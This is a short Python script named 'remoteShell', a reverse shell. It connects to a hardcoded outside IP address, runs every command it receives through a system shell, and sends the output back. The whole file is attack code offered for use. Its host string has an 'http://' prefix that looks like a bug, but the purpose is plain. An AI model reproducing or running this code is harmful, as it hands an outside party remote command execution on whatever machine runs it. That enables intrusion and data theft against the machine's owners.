#!/usr/bin/env python3
"""
author = "Craig Opie"
author_email = "craigopie@gmail.com"
name = "remoteShell"
version = "1.0.0"
description = "A reverse shell used to connect the client to a server."

"""
import socket
import os
import subprocess


s = socket.socket()
host = 'http://35.247.92.172'
port = 1024


s.connect((host, port))


while True:

    data = s.recv(1024)
    if data[:2].decode("utf-8") == 'cd':
        os.chdir(data[3:].decode("utf-8"))

    if len(data) > 0:
        cmd = subprocess.Popen(data[:].decode("utf-8"),shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        output_byte = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_byte,"utf-8")
        currentWD = os.getcwd() + "> "
        s.send(str.encode(output_str + currentWD))

        print(output_str)
